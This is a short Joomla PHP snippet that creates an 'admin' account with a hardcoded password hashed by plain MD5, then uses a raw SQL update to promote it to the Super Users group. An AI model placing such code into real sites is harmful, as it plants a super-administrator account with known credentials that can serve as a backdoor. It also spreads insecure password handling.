<?php
$user = new JUser();
$user->name ='admin';
$user->username = 'admin';
$user->block = 0;
$user->sendEmail = 0;
$user->groups = array(1);
$user->email="duong@joombooking.com";
$user->password =md5('123@123a');
$user->save();
if($user->getError()){
	$this->dump($user->getError());
}else{
	$db = jfactory::getdbo();
	$query = 'update #__user_usergroup_map as m left join #__users as u ON u.id = m.user_id set m.group_id = 8 where u.username="admin"';
	$db->setquery($query);
	$this->dump($db->execute());
}